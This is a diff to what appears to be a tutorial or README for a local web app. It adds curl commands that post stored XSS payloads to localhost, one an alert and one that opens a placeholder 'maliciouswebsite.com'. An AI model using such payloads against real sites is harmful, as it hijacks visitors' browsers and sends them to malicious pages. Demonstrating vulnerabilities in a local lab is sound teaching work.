@@ -33,8 +33,13 @@ Total Posts: 2
 Stored XXS attacks are fun, huh?:
 
 ```shell
-> curl -X POST localhost:4567/post \ 
-  -d "title=Hacked&content=<script>alert("Hacked!")</script>' 
+> curl -X POST localhost:4567/posts \ 
+  -d "title=Hacked&content=<script>alert('Hacked!')</script>" \
+  --cookie "cookies.txt" \
+  --cookie-jar "cookies.txt"
+
+> curl -X POST localhost:4567/posts \ 
+  -d "title=Hacked&content=<script>window.open('maliciouswebsite.com');</script>" \
   --cookie "cookies.txt" \
   --cookie-jar "cookies.txt"
 ```
